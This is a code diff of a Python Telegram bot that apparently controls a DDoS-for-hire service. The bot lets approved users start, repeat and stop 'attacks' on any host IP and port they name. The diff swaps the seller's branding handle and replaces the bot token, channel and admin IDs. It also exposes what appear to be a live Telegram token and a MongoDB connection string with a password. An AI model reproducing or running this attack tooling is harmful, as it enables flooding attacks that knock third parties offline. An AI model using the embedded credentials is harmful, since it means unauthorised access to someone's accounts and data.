@@ -15,14 +15,14 @@ import signal
 
 # Set constants and configure logging
 REQUEST_INTERVAL = 1
-TOKEN = '7627088936:AAG3_n2skf9fPzkmGR-EQfwAY1LzwpZCOtw'
+TOKEN = '7775568946:AAFBEkAF1PPUqmAp7ceZuD4gE7rUJIJ4Lqk'
 MONGO_URI = 'mongodb+srv://deepaidb:51354579914@deepaidb.imzonfj.mongodb.net/?retryWrites=true&w=majority&appName=deepaidb'
-CHANNEL_ID = -1002286117665
-ADMIN_IDS = [6166761862]
+CHANNEL_ID = -1002295059632
+ADMIN_IDS = [6586085607]
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['@ArbazModsOwner']
+db = client['@SKBOSSJADU']
 users_collection = db.users
 
 bot = telebot.TeleBot(TOKEN)
@@ -85,7 +85,7 @@ def check_user_approval(user_id):
     return False
 
 def send_not_approved_message(chat_id):
-    bot.send_message(chat_id, "*YOU ARE NOT APPROVED\n\nBy @ArbazModsOwner*", parse_mode='Markdown')
+    bot.send_message(chat_id, "*YOU ARE NOT APPROVED\n\nBy @SKBOSSJADU*", parse_mode='Markdown')
 
 def send_main_buttons(message):
     markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
@@ -95,7 +95,7 @@ def send_main_buttons(message):
     btn_stop = KeyboardButton("Stop Attack 🤐")
     markup.add(btn_attack, btn_start, btn_reattack, btn_stop)
 
-    bot.send_message(message.chat.id, "*Choose an action:\n\nBy @ArbazModsOwner*", reply_markup=markup, parse_mode='Markdown')
+    bot.send_message(message.chat.id, "*Choose an action:\n\nBy @SKBOSSJADU*", reply_markup=markup, parse_mode='Markdown')
 
 @bot.message_handler(commands=['start'])
 def start_command(message):
@@ -107,7 +107,7 @@ def approve_user(message):
     chat_id = message.chat.id
 
     if not is_user_admin(user_id, chat_id):
-        bot.send_message(chat_id, "*You are not authorized to use this command\n\nPlease contact @ArbazModsOwner *", parse_mode='Markdown')
+        bot.send_message(chat_id, "*You are not authorized to use this command\n\nPlease contact @SKBOSSJADU *", parse_mode='Markdown')
         return
 
     try:
@@ -200,7 +200,7 @@ def start_attack(message):
                 bot.send_message(chat_id, "*Previous attack is still running. Stopping previous attack...*", parse_mode='Markdown')
                 run_attack_command_sync(target_ip, target_port, 2)
             run_attack_command_sync(target_ip, target_port, 1)
-            bot.send_message(chat_id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\n\nBy @ArbazModsOwner*", parse_mode='Markdown')
+            bot.send_message(chat_id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\n\nBy @SKBOSSJADU*", parse_mode='Markdown')
             previous_attack_details[user_id] = (target_ip, target_port)
         else:
             bot.send_message(chat_id, "*Invalid IP or port. Please use /Attack to set them up.*", parse_mode='Markdown')
@@ -221,7 +221,7 @@ def reattack(message):
             bot.send_message(chat_id, "*Previous attack is still running. Stopping previous attack...*", parse_mode='Markdown')
             run_attack_command_sync(target_ip, target_port, 2)
         user_attack_details[user_id] = (target_ip, target_port)
-        bot.send_message(chat_id, f"*Reattack started 💥\n\nHost: {target_ip}\nPort: {target_port}\n\nBy @ArbazModsOwner*", parse_mode='Markdown')
+        bot.send_message(chat_id, f"*Reattack started 💥\n\nHost: {target_ip}\nPort: {target_port}\n\nBy @SKBOSSJADU*", parse_mode='Markdown')
         run_attack_command_sync(target_ip, target_port, 1)
     else:
         bot.send_message(chat_id, "*No previous attack details found.*", parse_mode='Markdown')
@@ -237,12 +237,12 @@ def stop_attack(message):
         target_ip, target_port = attack_details
         if target_ip and target_port:
             run_attack_command_sync(target_ip, target_port, 2)
-            bot.send_message(chat_id, f"*Attack stopped for Host: {target_ip} and Port: {target_port}\n\nBy @ArbazModsOwner*", parse_mode='Markdown')
+            bot.send_message(chat_id, f"*Attack stopped for Host: {target_ip} and Port: {target_port}\n\nBy @SKBOSSJADU*", parse_mode='Markdown')
             user_attack_details.pop(user_id, None)
         else:
-            bot.send_message(chat_id, "*IP and port are not set properly. Cannot stop attack.\n\nBy @ArbazModsOwner*", parse_mode='Markdown')
+            bot.send_message(chat_id, "*IP and port are not set properly. Cannot stop attack.\n\nBy @SKBOSSJADU*", parse_mode='Markdown')
     else:
-        bot.send_message(chat_id, "*No active attack found to stop.\n\nBy @ARBAZMODSOWNER*", parse_mode='Markdown')
+        bot.send_message(chat_id, "*No active attack found to stop.\n\nBy @SKBOSSJADU*", parse_mode='Markdown')
 
 if __name__ == "__main__":
     asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
